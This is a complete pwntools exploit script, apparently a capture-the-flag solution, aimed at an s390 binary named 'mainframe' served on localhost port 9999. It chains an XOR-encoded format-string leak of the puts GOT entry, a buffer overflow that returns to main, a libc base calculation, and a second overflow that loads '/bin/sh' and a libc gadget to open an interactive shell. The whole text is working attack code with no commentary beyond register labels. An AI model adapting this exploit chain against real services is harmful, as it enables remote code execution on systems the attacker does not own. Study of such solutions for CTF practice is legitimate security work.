from pwn import *

elf = ELF("./mainframe")
libc = ELF("./libc.so.6")
context.arch = "s390"
context.bits = 64
conn = remote("localhost", 9999)

payload = xor(b"%6$s\0\0\0\0" + p64(elf.got.puts+2), b"R")
payload = payload.ljust(1120, b"a")
payload += p64(0)  # r11
payload += p64(0)  # r12
payload += p64(0)  # r13
payload += p64(elf.sym.main) # r14
conn.send(payload) # ret2main

conn.recvuntil(b"...\n")
libc.address = u64(b"\0\0" + conn.recv(6)) - libc.sym.puts # leak libc
info("libc @ " + hex(libc.address))

payload = b""
payload = payload.ljust(1120, b"a")
payload += p64(0)  # r11
payload += p64(0)  # r12
payload += p64(next(libc.search(b'/bin/sh'))) # r13, gets popped into r2
payload += p64(libc.address + 0xda680) # r14, our shell gadget
conn.send(payload)

conn.interactive()
